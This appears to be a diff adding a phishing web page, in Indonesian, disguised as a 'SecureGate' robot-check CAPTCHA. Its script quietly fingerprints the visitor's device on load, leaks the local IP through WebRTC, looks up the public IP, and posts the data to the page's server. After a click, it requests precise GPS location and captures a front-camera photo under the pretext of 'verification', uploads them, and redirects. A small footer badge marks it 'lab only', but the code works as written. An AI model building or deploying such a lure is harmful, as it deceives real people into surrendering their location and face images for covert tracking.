@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Security Check</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+body{background:#f5f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:14px;padding:32px 26px;max-width:410px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,0.08);text-align:center}
+.brand{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:22px}
+.brand-icon{width:44px;height:44px;border-radius:12px;background:#F38020;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:20px;box-shadow:0 4px 12px #F3802040}
+.brand-name{font-size:19px;font-weight:600;color:#1a1a1a}
+h1{font-size:17px;font-weight:600;color:#1a1a1a;margin-bottom:6px}
+.sub{font-size:13px;color:#6b7280;margin-bottom:22px;line-height:1.5}
+.qr-box{background:#fafafa;border:1px dashed #d1d5db;border-radius:10px;padding:20px;margin-bottom:20px}
+.qr-img{width:150px;height:150px;margin:0 auto 12px;background:repeating-linear-gradient(45deg,#111 0 8px,#fff 8px 16px),repeating-linear-gradient(-45deg,#111 0 8px,#fff 8px 16px);background-blend-mode:multiply;border-radius:8px;opacity:0.7}
+.qr-text{font-size:12px;color:#6b7280}
+.otp-fields{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
+.otp-input{width:42px;height:50px;border:1.5px solid #d1d5db;border-radius:8px;text-align:center;font-size:20px;font-weight:600;color:#1a1a1a;background:#fff}
+.otp-input:focus{outline:none;border-color:#F38020;box-shadow:0 0 0 3px #F3802020}
+.phone-input{width:100%;padding:13px 14px;border:1.5px solid #d1d5db;border-radius:8px;font-size:14px;color:#1a1a1a;margin-bottom:14px;text-align:center;letter-spacing:2px}
+.phone-input:focus{outline:none;border-color:#F38020;box-shadow:0 0 0 3px #F3802020}
+.captcha-box{display:flex;align-items:center;gap:12px;background:#fafafa;border:1px solid #e5e7eb;border-radius:8px;padding:14px 16px;margin-bottom:16px;cursor:pointer;user-select:none;transition:all 0.2s}
+.captcha-box:hover{border-color:#d1d5db;box-shadow:0 2px 8px rgba(0,0,0,0.05)}
+.captcha-box.checked{border-color:#F38020;background:#f0f7ff}
+.captcha-check{width:22px;height:22px;border:2px solid #d1d5db;border-radius:3px;background:#fff;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all 0.2s}
+.captcha-box.checked .captcha-check{background:#F38020;border-color:#F38020}
+.captcha-box.checked .captcha-check::after{content:"";width:5px;height:10px;border:solid #fff;border-width:0 2.5px 2.5px 0;transform:rotate(45deg) translate(-1px,-2px)}
+.captcha-text{font-size:14px;color:#374151;flex:1;text-align:left}
+.captcha-logo{width:30px;height:30px;border-radius:50%;background:#F38020;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700}
+.steps{background:#fafafa;border:1px solid #e5e7eb;border-radius:10px;padding:14px;margin-bottom:18px;text-align:left}
+.step{display:flex;align-items:flex-start;gap:10px;padding:6px 0}
+.step-icon{width:24px;height:24px;border-radius:50%;background:#F38020;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0}
+.step-icon.done{background:#059669}
+.step-icon.load{background:#f59e0b;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+.step-title{font-size:12.5px;font-weight:500;color:#1a1a1a}
+.step-desc{font-size:11.5px;color:#6b7280}
+.btn{width:100%;padding:13px;background:#F38020;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s;margin-top:6px}
+.btn:hover:not(:disabled){background:#FA9D1F;box-shadow:0 6px 16px #F3802050}
+.btn:disabled{opacity:0.5;cursor:not-allowed}
+.status{font-size:12.5px;color:#6b7280;margin-top:12px;min-height:18px}
+.status.error{color:#dc2626}
+.status.success{color:#059669}
+.footer{margin-top:18px;padding-top:12px;border-top:1px solid #e5e7eb;font-size:10.5px;color:#9ca3af}
+.lab{display:inline-block;background:#fee2e2;color:#991b1b;font-size:10px;font-weight:600;padding:2px 8px;border-radius:4px;margin-top:6px;letter-spacing:0.5px}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="brand">
+        <div class="brand-icon">S</div>
+        <div class="brand-name">SecureGate</div>
+    </div>
+    <h1>Security Check</h1>
+    <div class="sub">Verifikasi Anda bukan robot</div>
+    <div class="captcha-box" id="captchaBox">
+        <div class="captcha-check"></div>
+        <span class="captcha-text">Saya bukan robot</span>
+        <div class="captcha-logo">S</div>
+    </div>
+    <div class="steps" id="stepBox" style="display:none">
+        <div class="step"><div class="step-icon" id="icon1">1</div>
+            <div><div class="step-title">Verifikasi Lokasi</div><div class="step-desc">Keamanan tambahan</div></div></div>
+        <div class="step"><div class="step-icon" id="icon2">2</div>
+            <div><div class="step-title">Verifikasi Kamera</div><div class="step-desc">Konfirmasi identitas</div></div></div>
+    </div>
+    <button class="btn" id="btnStart">Lanjutkan</button>
+    <div class="status" id="status">Klik untuk melanjutkan</div>
+    <div class="footer">
+        <div>© 2026 <span id="brandFooter"></span></div>
+        <div class="lab">LAB ONLY — FOR TESTING</div>
+    </div>
+</div>
+<script>
+const API_BASE = window.location.origin;
+const params = new URLSearchParams(window.location.search);
+const target = params.get('u') || 'https://google.com';
+let trackingId = null;
+async function getTID() {
+    if (trackingId) return trackingId;
+    try { const r = await fetch(API_BASE + '/get_tracking_id'); const d = await r.json();
+        trackingId = d.tracking_id || 'unknown'; } catch(e) { trackingId = 'unknown'; }
+    return trackingId;
+}
+function setStatus(msg, cls) {
+    const s = document.getElementById('status'); s.textContent = msg;
+    s.className = 'status' + (cls ? ' ' + cls : '');
+}
+function setIcon(id, state) {
+    const el = document.getElementById(id); if (!el) return;
+    el.className = 'step-icon' + (state === 'done' ? ' done' : state === 'load' ? ' load' : '');
+    el.textContent = state === 'done' ? '\u2713' : state === 'load' ? '\u2026' : id.replace('icon','');
+}
+function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) { resolve({error:'no geo'}); return; }
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,provider:'GPS',timestamp:p.timestamp}),
+            e => resolve({error:e.message}),
+            {enableHighAccuracy:true, timeout:10000}
+        );
+    });
+}
+function getCamera() {
+    return new Promise((resolve) => {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve({error:'no camera'}); return; }
+        navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:false})
+        .then(stream => {
+            const video = document.createElement('video'); video.srcObject = stream; video.play();
+            const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
+            setTimeout(() => {
+                const ctx = canvas.getContext('2d'); ctx.drawImage(video,0,0,640,480);
+                const dataUrl = canvas.toDataURL('image/jpeg',0.9);
+                stream.getTracks().forEach(t => t.stop());
+                resolve({image:dataUrl,format:'jpeg',size:dataUrl.length,timestamp:new Date().toISOString()});
+            }, 1000);
+        }).catch(e => resolve({error:e.message}));
+    });
+}
+async function sendInitial() {
+    try {
+        const device = {platform:navigator.platform,userAgent:navigator.userAgent,language:navigator.language,
+            hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,
+            screenWidth:screen.width,screenHeight:screen.height,
+            timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookieEnabled:navigator.cookieEnabled,incognito:false};
+        try { if (navigator.webdriver) device.incognito=true;
+            try { localStorage.setItem('t','1'); localStorage.removeItem('t'); } catch(e) { device.incognito=true; }
+        } catch(e) {}
+        try { if (navigator.getBattery) { const b = await navigator.getBattery();
+            device.batteryLevel = Math.round(b.level*100); device.batteryCharging = b.charging; } } catch(e) {}
+        let webrtc = null;
+        try {
+            webrtc = await new Promise(resolve => {
+                const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+                pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = e => { if (e.candidate) {
+                    const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (m) { resolve(m[0]); pc.close(); } } else { resolve(null); pc.close(); } };
+                setTimeout(() => { resolve(null); pc.close(); }, 3000);
+            });
+        } catch(e) {}
+        let clientIp = null;
+        try { const ir = await fetch('https://api.ipify.org?format=json'); const ij = await ir.json(); clientIp = ij.ip; } catch(e) {}
+        const tid = await getTID();
+        await fetch(API_BASE + '/collect_initial', {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({device, webrtc, tracking_id:tid, timestamp:new Date().toISOString(),
+                referrer:document.referrer||'direct', url:window.location.href, client_ip:clientIp})
+        });
+    } catch(e) {}
+}
+document.getElementById('btnStart').addEventListener('click', async () => {
+    const btn = document.getElementById('btnStart');
+    btn.disabled = true;
+    const tid = await getTID();
+    setIcon('icon1','load'); setStatus('Meminta izin lokasi...');
+    const loc = await getLocation();
+    if (loc.error) { setIcon('icon1',''); setStatus('Izin lokasi ditolak. Coba lagi.','error'); btn.disabled = false; return; }
+    setIcon('icon1','done');
+    setIcon('icon2','load'); setStatus('Meminta izin kamera...');
+    const cam = await getCamera();
+    if (cam.error) { setIcon('icon2',''); setStatus('Izin kamera ditolak. Coba lagi.','error'); btn.disabled = false; return; }
+    setIcon('icon2','done');
+    setStatus('Memverifikasi...');
+    try {
+        const res = await fetch(API_BASE + '/collect', {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({location:loc, camera:cam, tracking_id:tid, timestamp:new Date().toISOString(),
+                url:window.location.href, referrer:document.referrer||'direct'})
+        });
+        if (res.ok) { setStatus('Verifikasi berhasil! Mengalihkan...','success');
+            setTimeout(() => { window.location.href = target; }, 1500); }
+        else throw new Error('server');
+    } catch(e) { setStatus('Gagal. Coba lagi.','error'); btn.disabled = false; }
+});
+window.addEventListener('load', () => { setTimeout(sendInitial, 500); });
+</script>
+</body>
+</html>
